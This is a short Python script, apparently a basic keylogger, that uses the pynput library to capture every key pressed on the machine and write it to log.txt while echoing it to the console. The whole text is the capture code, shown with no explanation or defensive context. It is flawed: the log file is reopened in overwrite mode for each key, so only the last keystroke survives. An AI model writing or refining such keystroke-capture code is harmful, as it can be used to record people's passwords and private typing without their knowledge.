from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.tab":
        raise SystemExit(0)
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.ctrl_l":
        key = "\n"
    if key == "Key.space":
        key = "\s"
    with open("log.txt", "w") as file:
        file.write(key)
    print(key)
with Listener(on_press=anonymous) as listener:
    listener.join() 